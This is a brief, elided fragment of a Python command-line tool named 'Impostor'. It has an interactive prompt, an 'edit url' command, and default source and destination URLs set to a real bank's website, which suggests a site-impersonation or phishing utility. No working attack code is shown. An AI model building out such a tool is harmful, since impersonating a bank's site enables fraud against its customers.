#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Github: https://github.com/RhaB17369
...
""".format(CYAN, DEFAULT, GREEN, RED, CYANCLARO,GREEN))
	...
	while True:
		help()
		try:		
			comm=input("{0}Impostor{1} >> {2}".format(CYAN, RED, DEFAULT)).split()		
			if not comm:
				print(end=" ")
			elif comm[0]=="edit":
				if(comm[1]=="url"):
...
url="https://www.afrilandfirstbank.com/"  #default
url_destination="https://www.afrilandfirstbank.com/"  #default
